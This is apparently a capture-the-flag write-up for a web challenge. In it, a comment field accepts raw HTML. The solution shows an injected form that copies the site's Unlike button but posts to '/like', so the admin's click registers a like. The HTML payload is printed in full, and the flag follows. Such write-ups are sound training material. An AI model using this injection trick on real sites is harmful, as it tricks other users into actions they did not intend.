|---------- Challenge prompt ----------|

We do not need tons of like, we need only one like from a special person. 
But this person hate everybody and click only to the Unlike button. 
techcamp.jinblack.it:2011

|---------- Challenge solution ----------|

you can navigate to the website given by thew website 
register an account and log in. 
when making a post, in the comment field you can put a copy and paste of the unlike button
but changing the action to "/like" like this:

<form name="senderform" id="senderform" action="/like" method="POST">
    <button type="submit" name="unlike" value="unlike" class="btn btn-danger">Unlike</button>
    <input type="hidden" id="message_id" name="message_id" value={change with your post id, which is the id of the latest post +1}>
</form>

|---------- Challenge flag ----------|

flag{admin_likes_you_post!}